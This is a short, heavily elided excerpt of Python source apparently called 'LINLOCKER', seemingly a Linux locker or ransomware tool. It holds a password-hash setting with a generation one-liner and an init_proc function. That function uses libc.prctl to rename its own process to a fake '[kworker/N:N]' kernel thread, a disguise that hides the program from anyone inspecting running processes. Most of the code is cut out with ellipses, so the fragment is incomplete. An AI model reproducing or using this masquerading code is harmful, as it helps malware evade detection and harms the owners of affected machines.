...
#-----
#------
PASSWORD = '' # HERE IS LINLOCKER HASH SHA-256 OF PASSWORD | GENERATE: python -c "from hashlib import sha256;print(sha256('YOUR PASSWORD HERE'.encode()).hexdigest())"
...
def init_proc():
    ...
    try:
        ...
        libc.prctl(15, f'[kworker/{randint(0, 12)}:{randint(0, 12)}]'.encode()[:15], 0, 0, 0) 
    except: ...
